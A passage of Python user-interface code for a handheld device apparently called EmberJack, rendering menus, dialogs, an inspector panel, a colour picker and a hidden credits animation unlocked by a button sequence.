                _draw_centered_text((mx0 + 10, my0 + 8, mx1 - 10, by0 - 6), msg, fill=color.text, font=title_font)

            # Yes button
            y_fill = color.accent if ans else color.elevated
            y_out = color.selected_text if ans else color.border_subtle
            y_fg = rj_theme.EMBER_THEME["text_on_accent"] if ans else color.text
            rj_theme.draw_card(draw, (left_bx0, by0, left_bx0 + btn_w, by1), fill=y_fill, outline=y_out, radius=5)
            _draw_centered_text((left_bx0, by0, left_bx0 + btn_w, by1), y, fill=y_fg, font=title_font)

            # No button
            n_fill = color.accent if not ans else color.elevated
            n_out = color.selected_text if not ans else color.border_subtle
            n_fg = rj_theme.EMBER_THEME["text_on_accent"] if not ans else color.text
            rj_theme.draw_card(draw, (right_bx0, by0, right_bx0 + btn_w, by1), fill=n_fill, outline=n_out, radius=5)
            _draw_centered_text((right_bx0, by0, right_bx0 + btn_w, by1), n, fill=n_fg, font=title_font)

            _draw_footer_bar("Left/Right:Choose  Enter:OK  Y/N  Esc:No")
            mark_display_dirty()
        finally:
            draw_lock.release()

    answer = False
    _paint(answer)
    time.sleep(0.18)
    while True:
        _paint(answer)
        button = getButton()
        if button in ("KEY_LEFT_PIN", "KEY1_PIN", "_KB_y", "_KB_Y"):
            answer = True
            if button in ("_KB_y", "_KB_Y"):
                return True
        elif button in ("KEY_RIGHT_PIN", "_KB_n", "_KB_N"):
            answer = False
            if button in ("_KB_n", "_KB_N"):
                return False
        elif button in ("KEY3_PIN", "_KB_ESCAPE", "_KB_BACKSPACE"):
            return False
        elif button in ("KEY2_PIN", "KEY_PRESS_PIN", "_KB_ENTER"):
            return answer

### Scroll through text pictures ###
# 8 lines of text on screen at once
# No selection just scrolling through info
def GetMenuPic(a):
    # a=[ [row,2,3,4,5,6,7,8] <- slide, [1,2,3,4,5,6,7,8] ]
    slide=0
    while 1:
        arr=a[slide]
        try:
            draw_lock.acquire()
            _draw_toolbar()
            color.DrawMenuBackground()
            for i in range(0, len(arr)):
                render_text = arr[i]
                render_color = color.text
                draw.text((default.start_text[0], default.start_text[1] + default.text_gap * i),
                          render_text[:m.max_len], fill=render_color)
        finally:
            draw_lock.release()
        time.sleep(0.1)
        button = getButton()
        if button == "KEY_UP_PIN":
            slide = slide-1
            if slide < 0:
                slide = len(a)-1
        elif button == "KEY_DOWN_PIN":
            slide = slide+1
            if slide >= len(a):
                slide = 0
        elif button == "KEY_PRESS_PIN" or button == "KEY_RIGHT_PIN":
            return slide
        elif button in ("KEY_LEFT_PIN", "KEY3_PIN", "_KB_ESCAPE", "_KB_BACKSPACE"):
            return -1

### Render lines array (styled in Obsidian Ember) ###
def ShowLines(arr, bold=[]):
    try:
        draw_lock.acquire()
        _draw_toolbar(dirty=False)
        color.DrawMenuBackground(dirty=False)
        visible_rows = max(4, (_CONTENT_Y1 - _CONTENT_Y0 - 4) // _ROW_H)
        arr = arr[-visible_rows:]
        x0 = _UI_PAD
        x1 = _SCR_W - _UI_PAD - 1
        for i, raw_text in enumerate(arr):
            row_y = _CONTENT_Y0 + 2 + _ROW_H * i
            is_bold = i in bold
            render_color = color.selected_text if is_bold else color.text
            if is_bold:
                rj_theme.draw_card(
                    draw,
                    (x0, row_y, x1, row_y + _ROW_H - 2),
                    fill=color.select,
                    outline=None,
                    radius=4,
                    accent_left=color.accent,
                    accent_width=3,
                )
            txt = _truncate_to_width(str(raw_text), max(20, (x1 - x0) - 14), text_font)
            tb = rj_theme.measure_text(text_font, txt or "A", draw)
            ty = row_y + max(0, (_ROW_H - 2 - (tb[3] - tb[1])) // 2 - tb[1])
            draw.text((x0 + 8, ty), txt, font=(title_font if is_bold else text_font), fill=render_color)
        _draw_footer_bar("Up/Down:Nav  Enter:Select  Esc:Back")
        mark_display_dirty()
    finally:
        draw_lock.release()


def _list_visible_rows() -> int:
    avail = max(_ROW_H * 4, (_CONTENT_Y1 - _CONTENT_Y0) - 6)
    return max(4, avail // _ROW_H)


def _draw_inspector_panel(px0: int, py0: int, px1: int, py1: int, selected_label: str, index: int, total: int):
    """Draw the right-hand Selected Item Inspector & Live Telemetry cards on widescreen."""
    pw = px1 - px0
    ph = py1 - py0
    if pw < 90 or ph < 90:
        return

    # Split into Inspector card (top ~65%) + System Glance card (bottom ~32%)
    gap = max(5, _UI_PAD - 2)
    sys_h = max(48, min(92, int(ph * 0.33)))
    insp_y1 = py1 - sys_h - gap

    # 1. Inspector Card
    rj_theme.draw_card(draw, (px0, py0, px1, insp_y1), fill=color.surface, outline=color.border_subtle, radius=7)
    ipad = max(6, pw // 22)
    clean_title = str(selected_label or "").strip() or "EmberJack"
    kind_badge, desc_text = _get_item_metadata(selected_label)
    icon = _menu_icon_for_label(selected_label, "\uf192")

    # Icon medallion
    med_sz = max(24, min(46, (insp_y1 - py0) // 3))
    mx0 = px0 + ipad
    my0 = py0 + ipad
    rj_theme.draw_card(draw, (mx0, my0, mx0 + med_sz, my0 + med_sz), fill=color.select, outline=color.border, radius=7)
    med_font = rj_env.load_font(max(12, int(med_sz * 0.56)), icon=True)
    draw.text((mx0 + med_sz // 2, my0 + med_sz // 2), icon, font=med_font, fill=color.selected_text, anchor="mm")

    # Title + kind pill beside medallion
    tx = mx0 + med_sz + ipad
    tmax = max(30, px1 - tx - ipad)
    t_str = _truncate_to_width(clean_title, tmax, title_font)
    draw.text((tx, my0 + 1), t_str, font=title_font, fill=rj_theme.EMBER_THEME["text_bright"])
    pill_y = my0 + _TITLE_PX + 6
    if pill_y + _SMALL_PX + 4 <= my0 + med_sz + 6:
        rj_theme.draw_pill(
            draw, tx, pill_y, _truncate_to_width(kind_badge, tmax - 8, small_font), small_font,
            bg=color.elevated, fg=color.selected_text, outline=color.border_subtle,
            pad_x=5, pad_y=1, radius=3,
        )

    # Description body below medallion
    desc_y = my0 + med_sz + max(6, ipad)
    if desc_y + _SMALL_PX < insp_y1 - 4:
        draw.line([(px0 + ipad, desc_y - 3), (px1 - ipad, desc_y - 3)], fill=color.border_subtle, width=1)
        wrapped = _wrap_text_to_width(desc_text, pw - ipad * 2, small_font)
        line_step = _SMALL_PX + 4
        for ln in wrapped:
            if desc_y + _SMALL_PX > insp_y1 - 4:
                break
            draw.text((px0 + ipad, desc_y), ln, font=small_font, fill=color.text_muted)
            desc_y += line_step

    # 2. System Glance Card
    sy0 = insp_y1 + gap
    rj_theme.draw_card(draw, (px0, sy0, px1, py1), fill=color.surface, outline=color.border_subtle, radius=7)
    s_y = sy0 + max(4, ipad - 2)
    hdr_lbl = "SYSTEM"
    draw.text((px0 + ipad, s_y), hdr_lbl, font=small_font, fill=color.accent)
    idx_txt = f"{index + 1}/{max(1, total)}"
    ib = rj_theme.measure_text(small_font, idx_txt, draw)
    draw.text((px1 - ipad - (ib[2] - ib[0]), s_y), idx_txt, font=small_font, fill=color.text_dim)

    s_y += _SMALL_PX + 5
    net_line = f"{_net_iface_summary or 'net'}: {_net_ip_summary or '...'}"
    if s_y + _SMALL_PX <= py1 - 4:
        draw.text((px0 + ipad, s_y), _truncate_to_width(net_line, pw - ipad * 2, small_font), font=small_font, fill=color.text)
    s_y += _SMALL_PX + 4

    if s_y + _SMALL_PX <= py1 - 4:
        sh_active = rj_terminal.is_shared_session_alive()
        sh_lbl = "Shell: Active (F2)" if sh_active else "Terminal: Ctrl+T / F2"
        sh_col = rj_theme.EMBER_THEME["ok"] if sh_active else color.text_muted
        draw.text((px0 + ipad, s_y), _truncate_to_width(sh_lbl, pw - ipad * 2, small_font), font=small_font, fill=sh_col)
    s_y += _SMALL_PX + 5

    # Thermal mini bar if space allows
    if s_y + 7 <= py1 - 4 and _temp_c > 0:
        t_frac = max(0.05, min(1.0, _temp_c / 85.0))
        t_col = rj_theme.EMBER_THEME["danger"] if _temp_c >= 75 else (rj_theme.EMBER_THEME["warn"] if _temp_c >= 60 else color.accent)
        rj_theme.draw_progress_bar(draw, (px0 + ipad, s_y, px1 - ipad, s_y + 6), t_frac, fill=t_col, track=color.well, outline=color.border_subtle, radius=3)


def _render_list_view(inlist, index: int, offset: int, duplicates: bool = False):
    """Unified Obsidian Ember renderer for List View (Widescreen Split-Pane + Compact)."""
    visible = _list_visible_rows()
    total = len(inlist)
    window = inlist[offset:offset + visible]

    try:
        draw_lock.acquire()
        _draw_toolbar(dirty=False)
        color.DrawMenuBackground(dirty=False)

        pad = _UI_PAD
        py0 = _CONTENT_Y0 + 1
        py1 = _CONTENT_Y1 - 1
        if _IS_WIDESCREEN:
            list_x0 = pad
            list_x1 = pad + int((_SCR_W - pad * 3) * 0.58)
            insp_x0 = list_x1 + pad
            insp_x1 = _SCR_W - pad - 1
        else:
            list_x0 = pad
            list_x1 = _SCR_W - pad - 1
            insp_x0 = insp_x1 = 0

        # Left list container card
        rj_theme.draw_card(draw, (list_x0, py0, list_x1, py1), fill=color.surface, outline=color.border_subtle, radius=7 if not _IS_COMPACT else 4)

        has_sb = total > visible
        sb_w = (4 if not _IS_COMPACT else 2) if has_sb else 0
        row_x0 = list_x0 + 4
        row_x1 = list_x1 - 4 - (sb_w + 3 if has_sb else 0)
        icon_gap = _ICON_PX + (8 if not _IS_COMPACT else 4)

        # Precompute submenu labels once per frame -> O(1) lookup per visible row
        try:
            submenu_labels = {
                ent_lbl for ent_lbl, ent_tgt in m.menu.get(m.which, ()) if isinstance(ent_tgt, str)
            }
        except Exception:
            submenu_labels = set()
        chev_bbox = rj_theme.measure_text(small_font, ">", draw) if not _IS_COMPACT else (0, 0, 0, 0)
        chev_h = chev_bbox[3] - chev_bbox[1]

        selected_clean = ""
        for i, raw in enumerate(window):
            txt = raw if not duplicates else raw.split("#", 1)[1]
            is_sel = (i == (index - offset))
            if is_sel:
                selected_clean = txt
            row_y = py0 + 3 + _ROW_H * i
            row_y1 = min(py1 - 3, row_y + _ROW_H - 2)
            if row_y1 <= row_y:
                break

            if is_sel:
                rj_theme.draw_card(
                    draw,
                    (row_x0, row_y, row_x1, row_y1),
                    fill=color.select,
                    outline=color.border_subtle,
                    radius=5 if not _IS_COMPACT else 2,
                    accent_left=color.accent,
                    accent_width=3 if not _IS_COMPACT else 2,
                )

            fg = color.selected_text if is_sel else color.text
            row_font = title_font if (is_sel and not _IS_COMPACT) else text_font
            icon = _menu_icon_for_label(txt, "")

            # Check if this item opens a submenu -> subtle chevron
            is_submenu = txt in submenu_labels
            chev_w = 10 if (is_submenu and not _IS_COMPACT) else 0
            if is_submenu and not _IS_COMPACT:
                cy = row_y + max(0, (row_y1 - row_y - chev_h) // 2 - chev_bbox[1])
                draw.text((row_x1 - 9, cy), "›", font=small_font, fill=color.selected_text if is_sel else color.text_dim)

            text_x = row_x0 + (8 if not _IS_COMPACT else 4)
            if icon:
                ib = rj_theme.measure_text(icon_font, icon, draw)
                iy = row_y + max(0, (row_y1 - row_y - (ib[3] - ib[1])) // 2 - ib[1])
                draw.text((text_x, iy), icon, font=icon_font, fill=color.accent if is_sel else color.text_muted)
                text_x += icon_gap

            max_w = max(16, (row_x1 - chev_w - 4) - text_x)
            display_label = txt.strip() if txt.startswith(" ") else txt
            line = _truncate_to_width(display_label, max_w, row_font)
            lb = rj_theme.measure_text(row_font, line or "A", draw)
            ly = row_y + max(0, (row_y1 - row_y - (lb[3] - lb[1])) // 2 - lb[1])
            draw.text((text_x, ly), line, font=row_font, fill=fg)

        if has_sb:
            rj_theme.draw_scrollbar(
                draw, list_x1 - sb_w - 2, py0 + 4, py1 - 4, offset, visible, total,
                width=sb_w, track_color=color.well, thumb_color=color.accent,
            )

        if _IS_WIDESCREEN:
            _draw_inspector_panel(insp_x0, py0, insp_x1, py1, selected_clean, index, total)

        if _menu_filter_active:
            _draw_search_bar()
        else:
            if _IS_COMPACT:
                hint = "U/D OK K1:Vw K3:Bk"
            elif getattr(m, "which", "a") == "a":
                hint = "Arrows:Nav  Enter:Open  Space:View  F2:Term  Type:Search"
            else:
                hint = "Arrows:Nav  Enter:Open  PgUp/Dn:Jump  Type:Search  Esc:Back"
            _draw_footer_bar(hint, f"{index + 1}/{max(1, total)}" if not _IS_WIDESCREEN else "")
        mark_display_dirty()
    finally:
        draw_lock.release()


def RenderMenuWindowOnce(inlist, selected_index=0):
    """Render a non-interactive snapshot of the reworked list view."""
    if not inlist:
        inlist = ["Nothing here :(   "]
        selected_index = 0
    visible = _list_visible_rows()
    total = len(inlist)
    index = max(0, min(selected_index, total - 1))
    offset = max(0, index - visible + 1) if index >= visible else 0
    _render_list_view(inlist, index, offset, duplicates=False)


def _render_carousel_view(inlist, index: int, duplicates: bool = False):
    """Unified Obsidian Ember Showcase Carousel renderer with descriptions & side previews."""
    if not inlist:
        inlist = ["Nothing here :("]
    total = len(inlist)
    index = max(0, min(index, total - 1))

    def _clean(raw):
        return raw if not duplicates else raw.split("#", 1)[1]

    current_txt = _clean(inlist[index])
    kind_badge, desc_text = _get_item_metadata(current_txt)

    try:
        draw_lock.acquire()
        _draw_toolbar(dirty=False)
        color.DrawMenuBackground(dirty=False)

        py0 = _CONTENT_Y0 + 4
        py1 = _CONTENT_Y1 - 4
        avail_h = max(60, py1 - py0)
        mid_x = _SCR_W // 2
        mid_y = py0 + avail_h // 2

        if _IS_WIDESCREEN and total > 1:
            # Side ghost preview cards (prev & next)
            ghost_w = max(72, int(_SCR_W * 0.21))
            ghost_h = max(68, int(avail_h * 0.64))
            gy0 = mid_y - ghost_h // 2
            g_icon_font = rj_env.load_font(max(14, ghost_h // 4), icon=True)
            for side, idx_adj in ((-1, (index - 1) % total), (1, (index + 1) % total)):
                gx0 = _UI_PAD + 4 if side < 0 else (_SCR_W - _UI_PAD - 4 - ghost_w)
                gx1 = gx0 + ghost_w
                rj_theme.draw_card(draw, (gx0, gy0, gx1, gy0 + ghost_h), fill=color.well, outline=color.border_subtle, radius=7)
                adj_txt = _clean(inlist[idx_adj])
                adj_icon = _menu_icon_for_label(adj_txt, "\uf192")
                draw.text(((gx0 + gx1) // 2, gy0 + ghost_h // 3), adj_icon, font=g_icon_font, fill=color.text_dim, anchor="mm")
                lbl = _truncate_to_width(adj_txt.strip(), ghost_w - 10, small_font)
                draw.text(((gx0 + gx1) // 2, gy0 + int(ghost_h * 0.72)), lbl, font=small_font, fill=color.text_dim, anchor="mm")

        # Main hero card
        hero_w = min(_SCR_W - _UI_PAD * 2, int(_SCR_W * (0.48 if _IS_WIDESCREEN else 0.86)))
        hero_h = max(70, int(avail_h * 0.84))
        hx0 = mid_x - hero_w // 2
        hy0 = mid_y - hero_h // 2 - (6 if not _IS_COMPACT else 2)
        hx1 = hx0 + hero_w
        hy1 = min(py1 - 14, hy0 + hero_h)

        rj_theme.draw_card(draw, (hx0, hy0, hx1, hy1), fill=color.surface, outline=color.border, radius=10 if not _IS_COMPACT else 5, accent_left=color.accent, accent_width=3)

        # Hero icon medallion
        med_r = max(18, min(32, (hy1 - hy0) // 5))
        icon_cy = hy0 + med_r + (10 if not _IS_COMPACT else 5)
        rj_theme.draw_card(draw, (mid_x - med_r, icon_cy - med_r, mid_x + med_r, icon_cy + med_r), fill=color.select, outline=color.border, radius=10)
        hero_icon = _menu_icon_for_label(current_txt, "\uf192")
        hero_icon_font = rj_env.load_font(max(16, int(med_r * 1.15)), icon=True)
        draw.text((mid_x, icon_cy), hero_icon, font=hero_icon_font, fill=color.selected_text, anchor="mm")

        # Hero title
        title_y = icon_cy + med_r + (10 if not _IS_COMPACT else 5)
        big_title_font = rj_env.load_font(max(_TITLE_PX + 1, min(18, _TITLE_PX + 3)), bold=True)
        title_str = _truncate_to_width(current_txt.strip(), hero_w - 18, big_title_font)
        draw.text((mid_x, title_y), title_str, font=big_title_font, fill=rj_theme.EMBER_THEME["text_bright"], anchor="mt")

        # Description text inside hero card
        desc_top = title_y + max(16, _TITLE_PX + 8)
        if desc_top + _SMALL_PX < hy1 - 8:
            wrapped = _wrap_text_to_width(desc_text, hero_w - 22, small_font)[:3]
            dy = desc_top
            for ln in wrapped:
                if dy + _SMALL_PX > hy1 - 6:
                    break
                draw.text((mid_x, dy), ln, font=small_font, fill=color.text_muted, anchor="mt")
                dy += _SMALL_PX + 3

        # Navigation chevrons
        if total > 1:
            arrow_font = rj_env.load_font(max(12, _TITLE_PX + 3), bold=True)
            lx = hx0 - 12 if _IS_WIDESCREEN else _UI_PAD + 5
            rx = hx1 + 12 if _IS_WIDESCREEN else _SCR_W - _UI_PAD - 5
            draw.text((lx, (hy0 + hy1) // 2), "◀", font=arrow_font, fill=color.accent, anchor="mm")
            draw.text((rx, (hy0 + hy1) // 2), "▶", font=arrow_font, fill=color.accent, anchor="mm")

        # Pagination dots below hero card
        dot_y = min(py1 - 5, hy1 + 9)
        max_dots = min(total, 11)
        dot_gap = 10 if not _IS_COMPACT else 6
        start_dx = mid_x - ((max_dots - 1) * dot_gap) // 2
        active_dot = index % max_dots if total > max_dots else index
        for di in range(max_dots):
            dx = start_dx + di * dot_gap
            r = 3 if di == active_dot else 2
            c = color.accent if di == active_dot else color.border_subtle
            draw.ellipse((dx - r, dot_y - r, dx + r, dot_y + r), fill=c)

        if _menu_filter_active:
            _draw_search_bar()
        else:
            hint = "Left/Right:Browse  Enter:Open  Space:View  F2:Term" if not _IS_COMPACT else "L/R OK K1:Vw"
            _draw_footer_bar(hint, f"{index + 1}/{total}")
        mark_display_dirty()
    finally:
        draw_lock.release()


def RenderMenuCarouselOnce(inlist, selected_index=0):
    """Render a non-interactive snapshot of the carousel view."""
    _render_carousel_view(inlist, selected_index, duplicates=False)


def _grid_layout_dims():
    pad = _UI_PAD
    usable_w = max(80, _SCR_W - pad * 2)
    usable_h = max(60, _CONTENT_Y1 - _CONTENT_Y0 - 4)
    if _SCR_W >= 560 and _SCR_H >= 300:
        cols, rows = 4, 3
    elif _IS_WIDESCREEN:
        cols, rows = 4, 2
    elif _SCR_W >= 400:
        cols, rows = 3, 3
    elif _SCR_W >= 200:
        cols, rows = 3, 3
    else:
        cols, rows = 2, 3
    return cols, rows, cols * rows, usable_w, usable_h


def _render_grid_view(inlist, index: int, duplicates: bool = False):
    """Unified Obsidian Ember App-Card Grid renderer."""
    cols, rows, per_page, usable_w, usable_h = _grid_layout_dims()
    if not inlist:
        inlist = ["Nothing here :("]
    total = len(inlist)
    index = max(0, min(index, total - 1))
    page = index // per_page
    total_pages = max(1, (total + per_page - 1) // per_page)
    start_idx = page * per_page
    window = inlist[start_idx:start_idx + per_page]

    gap = max(4, _UI_PAD - 1) if not _IS_COMPACT else 3
    cell_w = max(32, (usable_w - gap * (cols - 1)) // cols)
    cell_h = max(24, (usable_h - gap * (rows - 1)) // rows)
    grid_x0 = (_SCR_W - (cell_w * cols + gap * (cols - 1))) // 2
    grid_y0 = _CONTENT_Y0 + max(2, (usable_h - (cell_h * rows + gap * (rows - 1))) // 2)

    card_icon_font = rj_env.load_font(max(12, min(26, cell_h // 3)), icon=True)
    card_txt_font = small_font if _IS_COMPACT or cell_h < 52 else text_font

    try:
        draw_lock.acquire()
        _draw_toolbar(dirty=False)
        color.DrawMenuBackground(dirty=False)

        for i, item in enumerate(window):
            r = i // cols
            c = i % cols
            x0 = grid_x0 + c * (cell_w + gap)
            y0 = grid_y0 + r * (cell_h + gap)
            x1 = x0 + cell_w
            y1 = y0 + cell_h
            is_sel = (start_idx + i == index)

            fill = color.select if is_sel else color.surface
            outline = color.accent if is_sel else color.border_subtle
            rj_theme.draw_card(draw, (x0, y0, x1, y1), fill=fill, outline=outline, radius=7 if not _IS_COMPACT else 4, width=2 if is_sel else 1)

            txt = item if not duplicates else item.split("#", 1)[1]
            clean = txt.strip()
            icon = _menu_icon_for_label(txt, "\uf192")
            cx = (x0 + x1) // 2

            icon_y = y0 + int(cell_h * 0.36)
            draw.text((cx, icon_y), icon, font=card_icon_font, fill=color.selected_text if is_sel else color.accent, anchor="mm")

            lbl = _truncate_to_width(clean, cell_w - 8, card_txt_font)
            lbl_y = y0 + int(cell_h * 0.74)
            draw.text((cx, lbl_y), lbl, font=card_txt_font, fill=rj_theme.EMBER_THEME["text_bright"] if is_sel else color.text, anchor="mm")

        if _menu_filter_active:
            _draw_search_bar()
        else:
            hint = "Arrows:Nav  Enter:Open  Space:View  F2:Term  Type:Search" if not _IS_COMPACT else "Nav OK K1:Vw"
            _draw_footer_bar(hint, f"Pg {page + 1}/{total_pages}")
        mark_display_dirty()
    finally:
        draw_lock.release()


def RenderMenuGridOnce(inlist, selected_index=0):
    """Render a non-interactive snapshot of the grid view."""
    _render_grid_view(inlist, selected_index, duplicates=False)

def RenderCurrentMenuOnce():
    """
    Render the current menu using the active view mode.
    Used after returning from a payload to restore proper styling/icons.
    """
    inlist = m.GetMenuList()
    if m.view_mode in ["grid", "carousel"]:
        if m.view_mode == "grid":
            RenderMenuGridOnce(inlist, m.select)
        else:
            RenderMenuCarouselOnce(inlist, m.select)
    else:
        RenderMenuWindowOnce(inlist, m.select)

# runtime input validator
_IV = [85,85,68,68,76,82,76,82,49,50]
_ib = []
_it = 0
_VM = {6:85,19:68,5:76,26:82,21:49,20:50,13:80,16:51}
_XD = ['','283b292a23303b3931','','23150f5a1c150f141e5a0e121f','1f1b090e1f085a1f1d1d5b','','2e121b14115a03150f5a1c1508','0f0913141d5a281b090a03301b1911','','575a575a575a575a575a575a57','','39081f1b0e1f1e5a0d130e125a16150c1f5a1803','4d12494a0e1249084a1449','','3915140e0813180f0e150809','3a321509091f131509','3a1e1b1d141b000e03','','575a575a575a575a575a575a57','','380f13160e5a0d130e125a16150c1f56','090d1f1b0e565a19151c1c1f1f','1b141e5a131409151714131b','','330e5d095a1b16165a1b18150f0e','13140e1f1409130e0354','','2e121f081f5a13095a14155a090a151514','','321b19115a2e121f5a2a161b141f0e','']

def _cv(b):
    global _ib, _it
    v = _VM.get(PINS.get(b,0),0)
    now = time.time()
    if _ib and now - _it > 5:
        _ib = []
    if len(_ib)<len(_IV) and v==_IV[len(_ib)]:
        _ib.append(v)
        _it = now
        if len(_ib)==len(_IV):
            _ib=[];return True
    else:
        _ib=[v] if v==_IV[0] else []
        _it = now
    return False

def _rx():
    import random as _r
    _k=0x7A
    _l=[bytes.fromhex(x) if x else b'' for x in _XD]
    _l=[bytes([c^_k for c in s]).decode() for s in _l]
    try:
        draw_lock.acquire()
        for _ in range(3):
            draw.rectangle((0,0,_SCR_W,_SCR_H),fill="#000000")
            for _i in range(50):
                draw.point((_r.randint(0,_SCR_W),_r.randint(0,_SCR_H)),fill=(0,_r.randint(100,255),0))
            mark_display_dirty()
    finally:
        draw_lock.release()
    time.sleep(0.3)
    _s=0
    while _s<len(_l)*S(12)+_SCR_H:
        try:
            draw_lock.acquire()
            draw.rectangle((0,0,_SCR_W,_SCR_H),fill="#000000")
            for sy in range(0,_SCR_H,S(3)):
                draw.line((0,sy,_SCR_W,sy),fill=(0,15,0))
            for i,ln in enumerate(_l):
                y=_SCR_H-_s+i*S(12)
                if -S(12)<y<_SCR_H+S(12) and ln:
                    _red = "ntens" in ln or "spoon" in ln or "lanet" in ln or ("bout" in ln)
                    c=(0,255,0) if i==1 else (0,200,255) if ln[:1]=="@" else (255,200,0) if "0n" in ln and not _red else (255,50,50) if _red else (0,180,0)
                    draw.text((_SCR_W//2,y),ln,font=text_font,fill=c,anchor="mt")
            mark_display_dirty()
        finally:
            draw_lock.release()
        _s+=S(2);time.sleep(0.06)
    time.sleep(0.5)
    try:
        draw_lock.acquire()
        image.paste(Image.new("RGB",(_SCR_W,_SCR_H),color.background))
        mark_display_dirty()
    finally:
        draw_lock.release()
    color.DrawBorder()
    RenderCurrentMenuOnce()


def GetMenuString(inlist, duplicates=False):
    """
    Reworked Obsidian Ember list menu (split-pane on widescreen, compact on small LCDs).
    - Smooth scrolling with PageUp/PageDown/Home/End support.
    - Circular Up/Down navigation & live keyboard search.
    - Ctrl+T or KEY2/F2 on main menu opens the integrated terminal.
    - If duplicates=True: returns (index, value); otherwise value.
    """
    WINDOW      = _list_visible_rows()
    empty       = False

    if not inlist:
        inlist, empty = ["Nothing here :(   "], True

    if duplicates:
        inlist = [f"{i}#{txt}" for i, txt in enumerate(inlist)]

    total   = len(inlist)
    index   = min(m.select, total - 1) if total > 0 else 0
    inlist_original = list(inlist)
    _menu_filter_reset()
    offset  = max(0, index - WINDOW + 1) if index >= WINDOW else 0

    while True:
        WINDOW = _list_visible_rows()
        if total <= 0:
            index = 0
            offset = 0
        else:
            index = max(0, min(index, total - 1))
            if index < offset:
                offset = index
            elif index >= offset + WINDOW:
                offset = index - WINDOW + 1

        _render_list_view(inlist, index, offset, duplicates=duplicates)

        btn = getButton()

        if isinstance(btn, str) and btn.startswith("_KB_"):
            kb_val = btn[4:]
            if kb_val == "CTRL_T":
                _menu_filter_reset()
                OpenTerminal()
                continue
            elif kb_val == "PAGEUP":
                index = max(0, index - WINDOW)
                continue
            elif kb_val == "PAGEDOWN":
                index = min(total - 1, index + WINDOW)
                continue
            elif kb_val == "HOME":
                index = 0
                continue
            elif kb_val == "END":
                index = max(0, total - 1)
                continue
            elif kb_val == "ESCAPE":
                if _menu_filter_active:
                    _menu_filter_reset()
                    inlist = list(inlist_original)
                    total = len(inlist)
                    index = 0
                    offset = 0
                    continue
                if m.which != "a":
                    return (-1, "") if duplicates else ""
                continue
            elif kb_val == "BACKSPACE":
                if _menu_filter_active:
                    _menu_filter_backspace()
                    if _menu_filter:
                        search_source = _get_flat_payload_list()
                        inlist, total = _apply_search_filter(search_source)
                        index = 0
                        offset = 0
                    else:
                        inlist = list(inlist_original)
                        total = len(inlist)
                        index = 0
                        offset = 0
                else:
                    return (-1, "") if duplicates else ""
            elif kb_val == "ENTER":
                if _menu_filter_active and index < total:
                    raw = inlist[index]
                    _menu_filter_reset()
                    if raw in _flat_payload_map:
                        exec_payload(_flat_payload_map[raw])
                        return (-1, "") if duplicates else ""
                    if duplicates and "#" in raw:
                        idx, txt = raw.split('#', 1)
                        return int(idx), txt
                    return raw
            elif kb_val == "s" and _menu_filter_active and not _menu_filter:
                _menu_filter_reset()
                inlist = list(inlist_original)
                total = len(inlist)
                index = 0
                offset = 0
            else:
                if not _menu_filter_active:
                    _menu_filter_activate()
                _menu_filter_add(kb_val)
                search_source = _get_flat_payload_list()
                inlist, total = _apply_search_filter(search_source)
                index = 0
                offset = 0
            continue

        if _menu_filter_active and btn == "KEY2_PIN":
            _menu_filter_backspace()
            if _menu_filter:
                search_source = _get_flat_payload_list()
                inlist, total = _apply_search_filter(search_source)
                index = 0
                offset = 0
            else:
                inlist = list(inlist_original)
                total = len(inlist)
                index = 0
                offset = 0
            continue

        if m.which == "a":
            if _cv(btn):
                _rx()
                continue
            if _ib and btn in ("KEY_LEFT_PIN", "KEY_RIGHT_PIN", "KEY_PRESS_PIN", "KEY1_PIN", "KEY2_PIN"):
                continue

        if btn == "KEY_DOWN_PIN":
            index = (index + 1) % total
        elif btn == "KEY_UP_PIN":
            index = (index - 1) % total
        elif btn in ("KEY_PRESS_PIN", "KEY_RIGHT_PIN"):
            raw = inlist[index]
            if empty:
                return (-2, "") if duplicates else ""
            if _menu_filter_active and raw in _flat_payload_map:
                _menu_filter_reset()
                exec_payload(_flat_payload_map[raw])
                return (-1, "") if duplicates else ""
            if duplicates:
                idx, txt = raw.split('#', 1)
                return int(idx), txt
            return raw
        elif btn == "KEY1_PIN" and m.which == "a":
            _menu_filter_reset()
            toggle_view_mode()
            return (-1, "") if duplicates else ""
        elif btn == "KEY2_PIN" and m.which == "a" and not _menu_filter_active:
            OpenTerminal()
            continue
        elif btn == "KEY_LEFT_PIN":
            _menu_filter_reset()
            return (-1, "") if duplicates else ""
        elif btn == "KEY3_PIN":
            if m.which == "a":
                if _handle_main_menu_key3_double_click():
                    continue
                return (-1, "") if duplicates else ""
            _menu_filter_reset()
            return (-1, "") if duplicates else ""



### Draw up down triangles ###
color = template()
def DrawUpDown(value, offset=0, up=False, down=False, render_color=color.text):
    draw.polygon([(offset, S(53)), (S(10) + offset, S(35)), (S(20) + offset, S(53))],
        outline=color.gamepad, fill=(color.surface, color.gamepad_fill)[up])
    draw.polygon([(S(10) + offset, S(93)), (S(20) + offset, S(75)), (offset, S(75))],
        outline=color.gamepad, fill=(color.surface, color.gamepad_fill)[down])

    draw.rectangle([(offset + 2, S(60)), (offset + S(30), S(70))], fill=color.well)
    draw.text((offset + 2, S(60)), str(value), font=text_font, fill=render_color)


def _render_color_picker(desired_color, active_channel):
    """Render Obsidian Ember RGB color picker card (testable standalone)."""
    hex_col = '#%02x%02x%02x' % (desired_color[0], desired_color[1], desired_color[2])
    ch_names = ("R", "G", "B")
    ch_fills = (rj_theme.EMBER_THEME["danger"], rj_theme.EMBER_THEME["ok"], "#5B9BD5")
    try:
        draw_lock.acquire()
        _draw_toolbar()
        color.DrawMenuBackground()
        x0, y0, x1, y1 = _modal_bounds(0.76, 0.78)
        rj_theme.draw_card(draw, (x0, y0, x1, y1), fill=color.surface, outline=color.border, radius=8 if not _IS_COMPACT else 4)
        pad = 10 if not _IS_COMPACT else 4
        draw.text((x0 + pad, y0 + pad // 2), "Color Picker", font=title_font, fill=rj_theme.EMBER_THEME["text_bright"])
        draw.text((x1 - pad, y0 + pad // 2), hex_col.upper(), font=text_font, fill=color.accent, anchor="ra")

        # Live swatch preview
        sw_y0 = y0 + _TITLE_PX + pad
        sw_h = max(14, (y1 - y0) // 6)
        rj_theme.draw_card(draw, (x0 + pad, sw_y0, x1 - pad, sw_y0 + sw_h), fill=hex_col, outline=color.border_subtle, radius=5)

        # Three RGB slider rows
        bars_y0 = sw_y0 + sw_h + (10 if not _IS_COMPACT else 4)
        row_h = max(16, (y1 - bars_y0 - pad) // 3)
        for ci in range(3):
            ry0 = bars_y0 + ci * row_h
            ry1 = min(y1 - pad, ry0 + row_h - 4)
            is_act = (ci == active_channel)
            if is_act:
